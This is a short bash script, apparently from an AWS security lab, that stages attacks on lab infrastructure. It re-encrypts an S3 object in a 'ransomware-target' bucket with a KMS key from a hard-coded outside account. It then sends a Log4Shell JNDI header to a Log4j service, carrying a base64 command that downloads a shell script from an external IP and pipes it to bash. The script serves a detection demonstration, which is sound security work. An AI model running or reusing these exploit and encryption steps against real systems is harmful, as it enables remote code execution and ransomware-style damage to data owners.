#!/bin/bash
sleep $((1 + $RANDOM % 10))
aws s3api list-buckets
aws s3 cp s3://$2-ransomware-target-bucket/awsimmersionday/app/app.zip s3://$2-ransomware-target-bucket/awsimmersionday/app/app.zip --sse aws:kms --sse-kms-key-id arn:aws:kms:us-west-2:911290716430:key/e1583228-d021-4f40-b83b-52fd722074e9
aws eks --region $1 update-kubeconfig --name $2-eks
log4jurl=$(kubectl describe service log4j-app | grep 'LoadBalancer Ingress:' | awk '{printf "http://%s:8080",$3;}')
echo $log4jurl
curl -v $log4jurl -H 'X-Api-Version:${jndi:ldap://93.189.42.8:5557/Basic/Command/Base64/KGN1cmwgLXMgOTMuMTg5LjQyLjgvbGguc2h8fHdnZXQgLXEgLU8tIDkzLjE4OS40Mi44L2xoLnNoKXxiYXNo}'
sleep $((1 + $RANDOM % 10))
demourl=$(kubectl describe service demo-app | grep 'LoadBalancer Ingress:' | awk '{printf "http://%s",$3;}')
echo $demourl
curl -v $demourl
